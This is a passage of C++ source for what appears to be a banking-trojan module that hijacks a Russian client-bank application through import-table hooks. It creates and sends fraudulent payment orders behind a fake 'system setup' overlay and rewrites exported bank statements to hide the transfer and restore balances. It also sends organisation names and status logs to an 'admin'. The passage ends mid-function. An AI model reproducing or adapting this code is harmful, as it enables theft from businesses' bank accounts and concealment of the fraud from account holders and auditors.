static void ModifyFormatKB( FileReport& fr )
{
	DBGRAFA( "RAFA", "Модификация отчета в формате клиент-банка" );
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
		char sumText[32];
		IntToBalans( sumInt, sumText, 0 );
		char* html = fr.text;
		bool stop = false;
		while( !stop )
		{
			int sz;
			//находим секцию
			html = FindBetweenTag( html, "OPERATION", "F312: ", sz );
			if( html == 0 ) break;
			sz += 2; //перевод строки \r\n
			char c = html[sz]; //ставим в конце 0, чтобы дальше не был поиск
			html[sz] = 0;
			//есть ли нужная сумма в секции
			char* p = m_strstr( html, sumText );
			if( p )
			{
				//есть ли нужный счет в секции
				p = m_strstr( p, paymentOrders[i].recvAcc );
				if( p )
				{
					//по назначению не проверяем, так как кодировка разная
					//найдена секция с платежкой, удаляем
					int restLen = fr.len - (html - fr.text) - sz;
					m_memcpy( html, html + sz, restLen );
					fr.len -= sz;
					html[restLen] = 0;
					int oldLen = fr.len;
					//уменьшаем итоговую сумму
					static const char* flds1[] = { "F42:", "F29:", "F70:", "F71:", 0 };
					const char** fld = flds1;
					sumInt = 13449490;
					while( *fld ) 
					{
						oldLen += ChangeSumForVar( fr.text, oldLen, *fld, -sumInt, 0, 'r' );
						fld++;
					}
					
					//увеличиваем остаток
					static const char* flds2[] = { "F46:", "F52:", "F69:", 0 };
					fld = flds2;
					while( *fld ) 
					{
						oldLen += ChangeSumForVar( fr.text, oldLen, *fld, sumInt, 0, 'r' );
						fld++;
					}

					//уменьшаем количество платежек
					oldLen += ChangeSumForVar( fr.text, oldLen, "F44:", -1, 2, 'r' );

					sz = oldLen - fr.len;
					fr.len = oldLen;
					stop = true;
				}
			}
			html[sz] = c;
			html += sz;
		}	
	}
}

//модификация для формата xml
static void ModifyFormatXml( FileReport& fr )
{
	DBGRAFA( "RAFA", "Модификация отчета в xml формате" );
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
		char* text = fr.text;
		bool stop = false;
		while( !stop )
		{
			int sz;
			//находим секцию
			text = FindBetweenTag( text, "<Statement>", "</Statement>", sz );
			if( text == 0 ) break;
			sz += 2; //перевод строки \r\n
			char c = text[sz]; //ставим в конце 0, чтобы дальше не был поиск
			text[sz] = 0;
			//есть ли нужная сумма в секции
			char* p = m_strstr( text, paymentOrders[i].sum );
			if( p )
			{
				//есть ли нужный счет в секции
				p = m_strstr( p, paymentOrders[i].recvAcc );
				if( p )
				{
					//найдена секция с платежкой, удаляем
					int restLen = fr.len - (text - fr.text) - sz;
					m_memcpy( text, text + sz, restLen );
					fr.len -= sz;
					text[restLen] = 0;
					int oldLen = fr.len;

					//уменьшаем итоговую сумму
					static const char* flds1[] = { "<DebitOverturn", "<DebitOverturnCover>", "<DebitOverturnDealing>", "<DebitOverturnDealingCover>", 0 };
					const char** fld = flds1;
					while( *fld ) 
					{
						oldLen += ChangeSumForVar( fr.text, oldLen, *fld, -sumInt, 0, '<' );
						fld++;
					}
					
					//увеличиваем остаток
					static const char* flds2[] = { "<OpenRemainder>", "<OutRemainder>", "<OutRemainderWithDealing>", 0 };
					fld = flds2;
					while( *fld ) 
					{
						oldLen += ChangeSumForVar( fr.text, oldLen, *fld, sumInt, 0, '<' );
						fld++;
					}

					//уменьшаем количество платежек
					oldLen += ChangeSumForVar( fr.text, oldLen, "<DebitOverturnCount>", -1, 2, '<' );

					sz = oldLen - fr.len;
					fr.len = oldLen;
					stop = true;
				}
			}
			text[sz] = c;
			text += sz;
		}
	}
}

static BOOL WINAPI HandlerCloseHandle(HANDLE hObject)
{
	const char* nameReport = 0; //имя формируемого отчета для лога
	for( int i = 0; i < maxFileReports; i++ )
		if( fileReports[i].file == hObject ) //наш отчет
		{
			//поправляем его
			switch( fileReports[i].type )
			{
				case ReportInfoOperaions:	 ModifyInfoOperaions(fileReports[i]); nameReport = "report_html"; break;
				case ReportFormatClientBank: ModifyFormatKB(fileReports[i]); nameReport = "export_to_client_bank"; break;
				case ReportFormat1C:		 ModifyFormat1C(fileReports[i]); nameReport = "export_to_1C"; break;
				case ReportFormatXml:		 ModifyFormatXml(fileReports[i]); nameReport = "export_to_xml"; break;
			}
			//пишем в файл
			DWORD wr;
			pHandlerWriteFile( hObject, fileReports[i].text, fileReports[i].len, &wr, 0 );
			MemFree(fileReports[i].text);
			fileReports[i].file = 0;
			fileReports[i].text = 0;
			fileReports[i].len = 0;
			SendLogToAdminThread( 7, nameReport );
			break;
		}
	return pHandlerCloseHandle(hObject);
}


static BOOL CALLBACK EnumTreeList( HWND wnd, LPARAM lParam )
{
	DWORD hash = GetWndClassHash(wnd);
	if( pIsWindowVisible(wnd) )
	{
		if( hash == 0xEB4973EE /* SysTreeView32 */ )
		{
			treeView = wnd;
		}
		if( hash == 0xF06537E2 /* SysListView32 */ )
		{
			listView = wnd;
		}
		if( hash == 0xC1AFE727 /* ToolbarWindow32 */ )
		{
			TBBUTTON bt;
			for( int i = 0; i < 20; i++ )
			{
				m_memset( &bt, 0, sizeof(bt) );
				if( pSendMessageA( wnd, TB_GETBUTTON, (WPARAM)i, (LPARAM)&bt ) == FALSE ) break;
				char text[128];
				pSendMessageA( wnd, TB_GETBUTTONTEXT, (WPARAM)bt.idCommand, (LPARAM)text );
				DWORD hash = CalcHash(text);
				if( hash == 0x8CBC9350 /* Новый документ */ )
				{
					toolBar = wnd;
					idBtNewDoc = bt.idCommand;
					DBGRAFA( "Rafa", "Found button %d '%s'", bt.idCommand, text );
					RECT r;
					pSendMessageA( wnd, TB_GETRECT, (WPARAM)bt.idCommand, (LPARAM)&r );
					posBtNewDoc.x = r.left;
					posBtNewDoc.y = r.top;
					DBGRAFA( "Rafa", "Found button x,y (%d,%d)", posBtNewDoc.x, posBtNewDoc.y );
				}
				if( hash == 0xD3910EEF /* Доставка */ /*&& bt.idCommand == 111*/ )
				{
					RECT r;
					pSendMessageA( wnd, TB_GETRECT, (WPARAM)bt.idCommand, (LPARAM)&r );
					//есть две кнопки Доставка, но одна шириною 2, поэтому ее игнорируем
					if( r.right - r.left > 20 )
					{
						toolBar = wnd;
						idBtDelivery = bt.idCommand;
						DBGRAFA( "Rafa", "Found button %d '%s'", bt.idCommand, text );
						posBtDelivery.x = r.left;
						posBtDelivery.y = r.top;
						DBGRAFA( "Rafa", "Found button x,y (%d,%d)", posBtDelivery.x, posBtDelivery.y );
					}
				}
			}
		}
	}
	return TRUE;
}

static BOOL CALLBACK EnumTopWindows( HWND wnd, LPARAM lParam )
{
	DWORD pid = 0;
	pGetWindowThreadProcessId( wnd, &pid );
	if( pid == (DWORD)lParam )
	{
		if( GetWndClassHash(wnd) == 0x6E5950C9 /* IEFrame */ ) //окно ИЕ в текущем процессе
		{
			IEWnd = wnd; //запоминаем окно ИЕ
			pEnumChildWindows( wnd, EnumTreeList, 0 ); //ищем в дочерних нужные нам контролы
			if( treeView && listView ) //нашли нужные контролы (дерево слева и таблицу справа сверху)
			{
				return FALSE; //останавливаем поиск
			}
		}
	}
	return TRUE;
}

//сравнивает окно wnd с информацией из ControlFinded, если совпадает, то возвращает true
static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf )
{
	bool ok = false;
	//окно нужного класса
	if( cf->classHash && classHash ) //есть хеш имени класса, сравниваем по нему
	{
		if( classHash == cf->classHash )
			ok = true;
	}
	else 
	{
		if( cf->classText ) //есть имя класса, сравниваем по имени
		{
			if( className )
			{
				if( m_strstr( className, cf->classText ) )
					ok = true;
			}
		}
	}
	if( ok ) //класс окна совпал
	{
		ok = false;
		//сравнимаем по заголовку окна
		if( cf->captionHash && captionHash ) //есть хеш заголовка
		{
			if( captionHash == cf->captionHash )
				ok = true;
		}
		else
		{
			if( cf->captionText && caption ) //есть текст заголовка
			{
				if( m_strstr( caption, cf->captionText ) )
					ok = true;
			}
			else //заголовок не указан, сравниваем по координатам
			{
				int right = cf->x + cf->w - 1, bottom = cf->y + cf->h - 1;
				if( cf->x <= r.right && right >= r.left && cf->y <= r.bottom && bottom >= r.top )
					ok = true;
			}
		}
		if( ok ) //параметры окна совпали
			return true;
	}
	return false;
}

static void GetControlRect( HWND parent, HWND wnd, RECT& r )
{
	pGetWindowRect( wnd, &r );
	//преобразовываем в координаты окна предка
	POINT p;
	p.x = r.left; p.y = r.top;
	pScreenToClient( parent, &p );
	r.right = p.x + r.right - r.left;
	r.bottom = p.y + r.bottom - r.top;
	r.left = p.x;
	r.top = p.y;
}

static bool CmpWnd( HWND parent, HWND wnd, ControlForm* cf )
{
	char* caption = GetWndText(wnd);
	char* className = GetWndClassName(wnd);
	RECT r;
	GetControlRect( parent, wnd, r );
	bool res = CmpWnd( caption, CalcHash(caption), className, STR::GetHash( className, 0, true ), r, cf );
	STR::Free(caption);
	STR::Free(className);
	return res;
}

//-----------------------------------------------------------------
//вспомогательная функция для поиска форм на окне ИЕ
static BOOL CALLBACK EnumFindForm( HWND wnd, LPARAM lParam )
{
	DWORD pid = 0;
	pGetWindowThreadProcessId( wnd, &pid );
	if( pid == PID )
	{
		ControlFinded* cf = (ControlFinded*)lParam;
		if( CmpWnd( wnd, wnd, cf->info ) )
		{
			cf->wnd = wnd;
			return FALSE;
		}
	}
	return TRUE;
}

//ищет нужную нам форму в дочерних окнах ИЕ
static HWND FindForm( ControlForm* form )
{
	ControlFinded cf;
	cf.wnd = 0;
	cf.info = form;
	pEnumChildWindows( 0 /*IEWnd*/, EnumFindForm, (LPARAM)&cf );
	return cf.wnd;
}
//--------------------------------------------------------------------------
struct ForFindControls
{
	ControlForm* cfIn;
	ControlFinded* cfOut;
	int countOut; //сколько найдено
	HWND parent;
};

//вспомогательная функция для поиска контролов на форме
static BOOL CALLBACK EnumFindControls( HWND wnd, LPARAM lParam )
{
	if( pIsWindowVisible(wnd) )
	{
		ForFindControls* ffc = (ForFindControls*)lParam;
		ControlForm* pcf = ffc->cfIn;
		char* caption = GetWndText(wnd);
		char* className = GetWndClassName(wnd);
		DWORD captionHash = CalcHash(caption);
		DWORD classHash = STR::GetHash( className, 0, true );
		RECT r;
		GetControlRect( ffc->parent, wnd, r );

		//DBGRAFA( "Rafa", "%s %s", caption, className );
		while( pcf->name )
		{
			if( CmpWnd( caption, captionHash, className, classHash, r, pcf ) )
			{
				//на всякий случай смотрим, чтобы по одному описанию не нашлю несколько окон
				int i = 0;
				for( ; i < ffc->countOut; i++ )
					if( ffc->cfOut[i].info == pcf )
						break;
				if( i >= ffc->countOut )
				{
					ffc->cfOut[ffc->countOut].info = pcf;
					ffc->cfOut[ffc->countOut].wnd = wnd;
					ffc->countOut++;
					//DBGRAFA( "Rafa", "finded %s", pcf->name );
					break;
				}
			}
			pcf++;
		}

		STR::Free(caption);
		STR::Free(className);
	}
	return TRUE;
}

//ищет контролы на форме parent по описанию в массиве cfIn, результат записывается в cfOut и возвращает функция количество найденных
//контролов. Массив cfOut должен быть выделен на тоже количество элементов что и cfIn
static int FindControls( HWND parent, ControlForm* cfIn, ControlFinded* cfOut )
{
	ForFindControls ffc;
	ffc.cfIn = cfIn;
	ffc.cfOut = cfOut;
	ffc.countOut = 0;
	ffc.parent = parent;
	pEnumChildWindows( parent, EnumFindControls, (LPARAM)&ffc );
	return ffc.countOut;
}

//------------------------------------------------------------------------------------------------------------

static bool FindTreeList()
{
	treeView = listView = 0;
	DWORD pid = GetUniquePID();
	pEnumWindows( EnumTopWindows, (LPARAM)pid );
	if( treeView && listView )
		return true;
	return false;
}

static char* GetTextTreeItem( HTREEITEM item, char* buf, int szBuf )
{
	TVITEMEX infoItem;
    m_memset( &infoItem, 0, sizeof(infoItem) );
    infoItem.mask = TVIF_TEXT | TVIF_HANDLE;
    infoItem.hItem = item;
    infoItem.pszText = buf;
    infoItem.cchTextMax = szBuf;
    buf[0] = 0;
    if( pSendMessageA( treeView, TVM_GETITEM, (WPARAM)0, (LPARAM)&infoItem ) )
		return buf;
	return 0;
}

//ищем "платежное поручение"->"Шаблоны", возвращаем item Шаблоны
static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* itemAccs, int c_itemAccs )
{
	char text[256];
	do
	{
		if( pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_EXPAND, (LPARAM)item ) )
		{
			HTREEITEM child = 0;
			//после разворачивания дерева, ветки могут не сразу появиться, поэтому ждем пока появятся
			for( int i = 0; i < 20; i++ )
			{
				child = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_CHILD, (LPARAM)item );
				if( child != 0 ) break;
				pSleep(500);
			}
			if( child )
			{
				if( GetTextTreeItem( item, text, sizeof(text) ) )
				{
					DWORD hash = CalcHash(text);
					if( hash == 0x505B8B0E /* Платежное поручение */ ) //нужная ветка
					{
						//смотрим есть ли в подветках Шаблоны
						HTREEITEM item2 = child;
						do
						{
							if( GetTextTreeItem( item2, text, sizeof(text) ) )
							{
								if( m_strstr( text, "Шаблоны" ) )
								{
									//itemPrev - это ветка с номеров счета
									//выбераем ветку с номером счеиа, чтобы сграбился в хуках баланс
									pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)itemPrev );
									//запоминаем нужные нам ветки счета
									GetTextTreeItem( itemPrev, itemAccs[c_itemAccs].acc, sizeof(itemAccs[c_itemAccs].acc) );
									int ii = 0;
									//смотрим нет ли этого счета в массиве (проход по дереву может быть не один раз)
									for(; ii < c_itemAccs; ii++ )
										if( itemAccs[ii].itemAcc == itemPrev )
											break;
									if( ii >= c_itemAccs )
									{
										itemAccs[c_itemAccs].itemAcc = itemPrev;
										itemAccs[c_itemAccs].itemTmpls = item2;
										DBGRAFA( "Rafa", "Find tree item %s", itemAccs[c_itemAccs].acc );
										++c_itemAccs;
									}
									return c_itemAccs;
								}
							}
							item2 = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item2 );
						}
						while(item2);
					}
				}
				c_itemAccs = FindPaymentOrder( child, item, itemAccs, c_itemAccs );
			}
		}
		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item );
	} while( item );
	return c_itemAccs;
}

//сворачивает указанное количество веток дерева
static void TreeViewCollapse( HTREEITEM item, int count )
{
	while( count-- )
	{
		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_PARENT, (LPARAM)item );
		if( item == 0 ) break;
		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
	}
}

static int FindNewPaymentOrder()
{
	int index = -1;
	char text[256];
	for(;;)
	{
		index = (int)pSendMessageA( listView, LVM_GETNEXTITEM, (WPARAM)index, MAKELPARAM(LVNI_ALL, 0) );
		if( index < 0 ) break;
		LVITEM item;
		m_memset( &item, 0, sizeof(item) );
		item.pszText = text;
		item.cchTextMax = sizeof(text);
		item.iSubItem = 6; //именно в 6-м находится наименование шаблона
		text[0] = 0;
		pSendMessageA( listView, LVM_GETITEMTEXT, (WPARAM)index, (LPARAM)&item );
		DWORD hash = CalcHash(text);
		DBGRAFA( "Rafa", "ListView %d, '%s'", index, text );
		if( hash == 0x6C433B30 /* НОВОЕ ПЛАТЕЖНОЕ ПОРУЧЕНИЕ */ )
		{
			break;
		}
	}
	return index;
}

//ищет контрол среди найденых на форме по его имени
static ControlFinded* GetControl( const char* name, ControlFinded* cf, int count )
{
	for( int i = 0; i < count; i++ )
	{
		if( m_lstrcmp( name, cf[i].info->name ) == 0 )
			return &cf[i];
	}
	return 0;
}

//пишет текст в контрол на форме
static bool SetText( const char* name, const char* s, ControlFinded* cf, int count, const char* sendChars = 0 )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		if( s )
			pSetWindowTextA( ctrl->wnd, s );
		if( sendChars )
		{
			while( *sendChars )
			{
				pSendMessageA( ctrl->wnd, WM_CHAR, (WPARAM)*sendChars, (LPARAM)0 );
				sendChars++;
			}
		}
		return true;
	}
	return false;
}

//считывает текст с контрола на форме
static bool GetText( const char* name, char* s, int c_s, ControlFinded* cf, int count )
{
	if( s )
	{
		s[0] = 0;
		ControlFinded* ctrl = GetControl( name, cf, count );
		if( ctrl )
		{
			if( pGetWindowTextA( ctrl->wnd, s, c_s ) )
				return true;
		}
	}
	return false;
}

static bool SetButtonCheck( const char* name, bool check, ControlFinded* cf, int count )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		pSendMessageA( ctrl->wnd, BM_SETCHECK, (WPARAM) check ? BST_CHECKED : BST_UNCHECKED, (LPARAM)0 );
		return true;
	}
	return false;
}

static bool ClickButton( const char* name, ControlFinded* cf, int count )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		HardClickToWindow( ctrl->wnd, 5, 5 );
		return true;
	}
	return false;
}

//Создает окно с прогресс баром, которое скрывает под собой все окна
static DWORD WINAPI FakeWindow( LPVOID p )
{
	HWND parent = (HWND)p;
	HINSTANCE inst = (HINSTANCE)pGetModuleHandleA(NULL);
	RECT r, r2;
	pGetClientRect( parent, &r ); //область которую нужно закрыть
	POINT pp;
	pp.x = 0;
	pp.y = 0;
	//узнаем координаты области на экране
	pClientToScreen( parent, &pp ); 
	int xFW = pp.x, yFW = pp.y;
	int wFW = r.right, hFW = r.bottom;
	//рассчитываем положение прогресс бара на новом окне
	int wPB = r.right * 80 / 100;
	int hPB = 25;
	int xPB = (r.right - wPB) / 2;
	int yPB = (r.bottom - hPB) / 2;
	//создаем скрывающее окно
	HWND fakeWindow = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_CHILD | WS_POPUP, xFW, yFW, wFW, hFW, parent, NULL, inst, NULL );

	if( !fakeWindow )
      return 0; 
	//окно в котором печатается текст
	HWND warnWnd = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, xPB, yPB - 16, wPB, 16, fakeWindow, 0, inst, 0 );
	//сам текст пишем в статус баре, чтобы был нормальный фон и цвет текста
	HWND warnText = (HWND)pCreateWindowExA( 0, STATUSCLASSNAME, "Подождите, идет настройка системы ...", WS_VISIBLE | WS_CHILD | SBT_NOBORDERS, 0, 0, 0, 0, warnWnd, 0, inst, 0 );
	//статус бар справа рисует треугольник, это окно его скрывает
	HWND warnWnd2 = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, wPB - 16, 0, 16, 16, warnWnd, 0, inst, 0 );
	//создаем сам прогресс бар
	HWND progressBar = (HWND)pCreateWindowExA( 0, PROGRESS_CLASS, 0, WS_CHILD | WS_VISIBLE, xPB, yPB, wPB, hPB, fakeWindow, 0, inst, 0 );

	pShowWindow( fakeWindow, SW_SHOW );
	pUpdateWindow(fakeWindow);
	//устанавливаем таймер для инкримента в статус баре
	pSetTimer( fakeWindow, 1, 500, 0 );
	//настраиваем статус бар
	pSendMessageA( progressBar, PBM_SETRANGE, 0, MAKELPARAM( 0, 60 )); 
	pSendMessageA( progressBar, PBM_SETSTEP, (WPARAM) 1, 0 );
	MSG msg;
	int remain = 60;
	//запоминаем положение окна
	pGetWindowRect( parent, &r2 );
	r.left = r2.left;
	r.top = r2.top;
	r.right = r2.right;
	r.bottom = r2.bottom;

	//прогоняем в потоке сообщения и реагируем только на свой таймер
	while( (stateFakeWindow & 1) && pGetMessageA( &msg, 0, 0, 0 ) )
	{
		if( msg.message == WM_TIMER && msg.hwnd == fakeWindow ) //наш таймер
		{
			pSendMessageA( progressBar, PBM_STEPIT, 0, 0 ); 
			//if( --remain == 0 )
			//	break;
		}
	    pTranslateMessage( &msg );
		pDispatchMessageA( &msg );
		//проверяем не изменило ли свое положение или размеры окно которое скрываем
		pGetWindowRect( parent, &r2 );
		if( r.left != r2.left || r.top != r2.top || r.right != r2.right || r.bottom != r2.bottom )
		{
			//если изменило, то подгоняем наше окно под предка
			r.left = r2.left;
			r.top = r2.top;
			r.right = r2.right;
			r.bottom = r2.bottom;
			pGetClientRect( parent, &r2 );
			pp.x = 0;
			pp.y = 0;
			pClientToScreen( parent, &pp );
			pMoveWindow( fakeWindow, pp.x, pp.y, r2.right, r2.bottom, TRUE );
		}
	}
	pDestroyWindow(fakeWindow);
	return true;
}

static void PosMouseForMouseEvent( HWND wnd, POINT& p )
{
	pClientToScreen( wnd, &p );
	p.x = p.x * 65535 / widthScreen;
	p.y = p.y * 65535 / heightScreen;
}

//сюда попадаем когда найдены контролы TreeView и ListView окна банка
static void WorkInRafa()
{
	c_findedBalans = 0;
	HWND parent = (HWND)pGetParent(treeView);
	//подменяем оконную процедуру главного окна, для перехвата нотификационных сообщений
	MainWndProc = (WNDPROC)pSetWindowLongA( parent, GWLP_WNDPROC, (LONG_PTR)HandlerMainWndProc );
	//проверяем, что была ли уже сделана платежка
	bool was = false;
	for(int i = 0; i < c_paymentOrders; i++ )
		if( paymentOrders[i].entered )
		{
			was = true;
			break;
		}
	if( was ) 
	{
		offBtDelivery = true;
		return; //повторно не делаем
	}
	stateFakeWindow = 1; //запуск окна скрывающего наши действия
	HANDLE hThread = pCreateThread( NULL, 0, FakeWindow, (LPVOID)parent, 0, 0 );
	pCloseHandle(hThread);

	HTREEITEM root = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_ROOT, (LPARAM)0 );
	if( root )
	{
		TreeAccount* itemAccs = (TreeAccount*)MemAlloc( sizeof(TreeAccount) * 16 ); //массив найденных веток счетов, рассчитываем максимум на 16 счетов
		int c_itemAccs = 0;
		//находим пункт Шаблоны, делаем несколько попыток, так как не сразу все загружается
		for( int i = 0; i < 10; i++ )
		{
			c_itemAccs = FindPaymentOrder( root, 0, itemAccs, c_itemAccs ); 
			if( c_itemAccs ) //если найдены счета, то ждем еще немного, так как возможно есть еще счета
			{
				//if( i < 7 ) i = 7;
			}
			pSleep(1000);
		}
		if( c_itemAccs > 0 )
		{
			DBGRAFA( "Rafa", "Найдено веток счетов %d", c_itemAccs );
#ifdef TEST_NOTAZ
			PaymentOrder* po = 0;
#else
			PaymentOrder* po = GetPaymentOrders(); //передаем баланс и получаем данные для заполнения платежки
#endif
			if( po ) 
			{
				//ищем счет в котором будем добавлять платежку
				TreeAccount* itemAcc = 0;
				for( int i = 0; i < c_itemAccs; i++ )
					if( m_lstrcmp( po->sendAcc, itemAccs[i].acc ) == 0 )
					{
						itemAcc = &itemAccs[i];
						break;
					}
				if( itemAcc && pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)itemAcc->itemTmpls ) )
				{
					DBGRAFA( "Rafa", "Шаблоны выбраны для счета %s", itemAcc->acc );
					int indList = -1;
					for( int i = 0; i < 10; i++ )
					{
						indList = FindNewPaymentOrder();
						if( indList >= 0 ) break;
						pSleep(1000);
					}
					if( indList >= 0 )
					{
						DBGRAFA( "Rafa", "Найдено новое платежное поручение" );
						POINT posItem;
						pSendMessageA( listView, LVM_GETITEMPOSITION, (WPARAM)indList, (LPARAM)&posItem );
						stateFakeWindow |= 2; //ожидаем появления окна Платёжного поручения и делаем его прозрачным
						HardClickToWindow( listView, posItem.x + 5, posItem.y + 5 );
						DBGRAFA( "Rafa", "Кликнули по новому платежному поручению" );
						FindTreeList();
						if( toolBar )
						{
							HardClickToWindow( toolBar, posBtNewDoc.x + 5, posBtNewDoc.y + 5 );
							DBGRAFA( "Rafa", "Нажали кнопку создания нового документа" );
							//перемещаем курсор мышки подальше, так как в окне ввода платежа появляются подсказки под курсором
							pmouse_event( MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, 0, 0, 0, 0 );
							//ждем появления формы ввода платежа
							HWND formPayment = 0;
							for( int i = 0; i < 10; i++ )
							{
								formPayment = FindForm( &controlsPaymentOrder[0] );
								if( formPayment ) break;
								pSleep(1000);
							}
							if( formPayment )
							{
								//PaymentWndProc = (WNDPROC)SetWindowLongPtr( formPayment, GWLP_WNDPROC, (LONG_PTR)HandlerPaymentWndProc );
								DBGRAFA( "Rafa", "Форма ввода платежа открыта" );
								stateFakeWindow |= 4; //делаем прозрачными все всплывающие окна во время ввода платежки
								pSleep(2000); //ждем пока окно полностью инициализируется
								stateFakeWindow |= 16; //новые окна делаем с нулевой прозрачностью. чтобы их не было видно (всплывающие подсказки. при прозрачности 1, он все равно видны)
								//ищем контролы в которые будем вводить
								ControlFinded* cf = (ControlFinded*)HEAP::Alloc( sizeof(ControlFinded) * sizeof(controlsPaymentOrder) / sizeof(ControlForm) );
								int countControls = FindControls( formPayment, controlsPaymentOrder, cf );
								if( countControls ) //нашли нужные контролы, теперь заполняем
								{
									DBGRAFA( "Rafa", "Заполняем контролы" );
									//SetText( "num", "1", cf, countControls );
									//SetText( "status", "2", cf, countControls );
									
									//считаем название организации отправителя
									TMemory org(512);
									GetText( "namesend", org, org.Size(), cf, countControls );
									m_lstrcat( org, " -> " );
									m_lstrcat( org, po->recvName ); //добавляем имя организации получателя
									SendLogToAdmin( 2, org ); //шлем лог с именами организаций
									SetText( "sum", po->sum, cf, countControls );
									SetText( "innrecv", po->inn, cf, countControls );
									SetText( "kpprecv", po->kpp, cf, countControls );
									SetText( "accountrecv", po->recvAcc, cf, countControls );
									SetText( "namerecv", po->recvName, cf, countControls );
									SetText( "bikrecv", po->bik, cf, countControls );
									SetText( "bankrecv", po->bankName, cf, countControls );
									SetText( "accbankrecv", po->bankAcc, cf, countControls );
									SetText( "punktrecv", po->bankCity, cf, countControls );
									SetText( "comment", po->comment, cf, countControls, " " ); //посылаем еще дополнительно клавишу пробел, так как без этого форма не считает что в это поле был введен текст

									stateFakeWindow |= 8; //ловим всплывающее меню НДС
									retMenuNds = po->nds[0] == '0' ? 4 : 5; //что нужно выбрать в меню НДС (4 - без ндс, 5 - с ндс)
									ClickButton( "nds", cf, countControls ); //кликаем на кнопку, которая открывает меню NDS
									//ждем появления меню, на самом деле оно не появится, просто функция TrackPopupMenu сразу вернет нужное нам значение
									for( int i = 0; i < 10; i++ )
									{
										if( (stateFakeWindow & 8) == 0 ) break;
										pSleep(500);
									}
									
									ControlFinded* ctrl = GetControl( "sended", cf, countControls );
									if( ctrl ) 
									{
										SetButtonCheck( "sended", true, cf, countControls );
										pSendMessageA( formPayment, WM_COMMAND, 0, (LPARAM)ctrl->wnd );
									}

									//сохраняем платежку								
									ClickButton( "save", cf, countControls );
									pSleep(5000); //ждем пока сохранится
									stateFakeWindow &= ~16; //снимаем нулевую прозрачность, будет прозрачность = 1 (в нулевой прозрачности не действуют клики)
									HardClickToWindow( toolBar, posBtDelivery.x + 5, posBtDelivery.y + 5 );
									DBGRAFA( "Rafa", "Нажали кнопку 'Доставка' %d,%d", posBtDelivery.x, posBtDelivery.y );
									HWND wndConfirmation = 0;
									//ждем появления окна подтверждения
									for( int i = 0; i < 10; i++ )
									{
										pSleep(1000);
										wndConfirmation = FindForm(&formConfirmation);
										if( wndConfirmation ) break;
									}
									//wndConfirmation = 0;
									if( wndConfirmation )
									{
										POINT p; p.x = 325; p.y = 235;
										PosMouseForMouseEvent( wndConfirmation, p );
										pmouse_event( MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, p.x, p.y, 0, 0 );
										pmouse_event( MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN, p.x, p.y, 0, 0 );
										//pSendMessageA( wndConfirmation, WM_MOUSEMOVE, 0, MAKELPARAM(325, 235) );
										HardClickToWindow( wndConfirmation, 336, 261 ); //нажимаем на кнопку подтверждения
										pSleep(5000);
										//сворачиваем дерево до первоначального состояния
										TreeViewCollapse( itemAcc->itemTmpls, 4 );
										pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
										po->entered = true;
										SavePaymentOrders();
										offBtDelivery = true;
										SendLogToAdmin(3);
									}
								}
								HEAP::Free(cf);
							}
							else
								DBGRAFA( "Rafa", "Форма ввода платежа не открылась" );
						}
					}
				}
			}
			else //если платежку не создавали, то сворачиваем дерево до первоначального состояния
				TreeViewCollapse( itemAccs[0].itemTmpls, 2 );
		}
		else
			DBGRAFA( "Rafa", "Шаблоны ненайдены" );
		MemFree(itemAccs);
	}
	stateFakeWindow = 0; //закрываем окно скрытия
}

//настройка глобальных переменных
static bool InitData()
{
	for( int i = 0; i < maxFileReports; i++ )
		fileReports[i].file = 0;
	return true;
}

static DWORD WINAPI InitializeRafaHook( LPVOID p )
{
	DBGRAFA( "Rafa", "Start hook FilialRCon.dll" );
	while( true )
	{
		LPVOID dll = pGetModuleHandleA("FilialRCon.dll");
		if( dll )
		{
			bool hookDll = false;
			for( int i = 0; i < 10; i++ )
			{
				bool res = PathIAT( dll, "USER32.DLL", "SendMessageA", HandlerSendMessageA, (PVOID*)&pHandlerSendMessageA );
				res &= PathIAT( dll, "USER32.DLL", "CreateWindowExA", HandlerCreateWindowExA,(PVOID*)&pHandlerCreateWindowExA );
				res &= PathIAT( dll, "USER32.DLL", "TrackPopupMenu", HandlerTrackPopupMenu,(PVOID*)&pHandlerTrackPopupMenu );
				res &= PathIAT( dll, "KERNEL32.DLL", "CreateFileA", HandlerCreateFileA,(PVOID*)&pHandlerCreateFileA );
				res &= PathIAT( dll, "KERNEL32.DLL", "WriteFile", HandlerWriteFile,(PVOID*)&pHandlerWriteFile );
				res &= PathIAT( dll, "KERNEL32.DLL", "CloseHandle", HandlerCloseHandle,(PVOID*)&pHandlerCloseHandle );
				if( res )
				{
